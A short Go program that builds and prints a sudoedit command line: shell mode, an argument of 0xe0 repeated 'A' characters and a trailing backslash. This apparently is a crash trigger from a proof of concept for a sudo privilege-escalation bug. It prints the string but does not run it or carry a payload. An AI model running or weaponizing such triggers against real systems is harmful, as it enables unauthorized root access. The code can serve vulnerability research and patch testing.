package main

import (
  "fmt"
  "strings"
)

func multiply_string(text string, repetition int) string {
  repeated_string := ""

  for i:=0; i < repetition; i++ {
    repeated_string += text
  }

  return repeated_string
}


func main() {
  argv_array := []string{"sudoedit", "-A", "-s", multiply_string("A", 0xe0) + "\\"}
  
  argv := strings.Join(argv_array, " ")
  
  fmt.Println(argv)
}